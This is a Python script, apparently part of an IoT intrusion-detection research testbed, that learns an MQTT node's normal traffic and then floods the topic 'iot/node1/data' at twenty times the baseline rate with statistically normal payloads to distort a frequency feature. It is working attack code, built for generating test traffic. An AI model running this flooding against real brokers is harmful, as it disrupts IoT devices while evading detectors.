"""
=========================================================
ATTACK: TRAFFIC FLOODING
=========================================================
Methodology Section 3.2.2 / Table 1:
  Increased message transmission frequency.
  Expected: F distorted (Medium risk)

Payload content stays statistically normal (full node1 schema,
learned IP) — only the transmission frequency is increased.
=========================================================
"""

import os
import time
from adaptive_learner import learn_network, make_client
import payloads

# =========================
# CONFIG
# =========================
BROKER         = os.environ.get("MQTT_BROKER", "localhost")
PORT           = 1883
USER           = "esp32user"
PASSWORD       = os.environ.get("MQTT_PASS", "")
TARGET_TOPIC   = "iot/node1/data"
ATTACKER_ID    = "attacker_flood_py"
LEARN_DURATION = 60
FLOOD_FACTOR   = 20   # times faster than learned baseline


def run(profile, broker=BROKER, port=PORT, user=USER, password=PASSWORD,
        target_topic=TARGET_TOPIC, duration=None, stop_event=None,
        on_publish=None, captured=None):
    """Flood the topic with normal-looking payloads at FLOOD_FACTOR speed.

    Returns the number of messages published.
    """
    client = make_client(ATTACKER_ID)
    client.username_pw_set(user, password)
    client.connect(broker, port, 60)
    client.loop_start()

    flood_interval = max(0.01, profile.interval_mean / FLOOD_FACTOR)
    count = 0
    end = time.time() + duration if duration else None
    try:
        while True:
            if stop_event is not None and stop_event.is_set():
                break
            if end is not None and time.time() >= end:
                break
            payload = payloads.build_payload(profile)
            client.publish(target_topic, payload)
            count += 1
            if on_publish:
                on_publish(payload)
            time.sleep(flood_interval)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()
    return count


def main():
    print("=== TRAFFIC FLOODING ATTACK (adaptive) ===")
    print(f"Target: {TARGET_TOPIC}\n")

    profile = learn_network(BROKER, PORT, USER, PASSWORD,
                             TARGET_TOPIC, learn_duration=LEARN_DURATION)

    flood_interval = profile.interval_mean / FLOOD_FACTOR
    print(f"\n=== ATTACK ACTIVE — baseline {profile.interval_mean:.2f}s, "
          f"flooding at {flood_interval:.3f}s ({FLOOD_FACTOR}x) ===")
    print("Only F should spike — D, T, P stay normal\n")
    run(profile, on_publish=lambda m: print(f"[flood] {m}"))


if __name__ == "__main__":
    main()
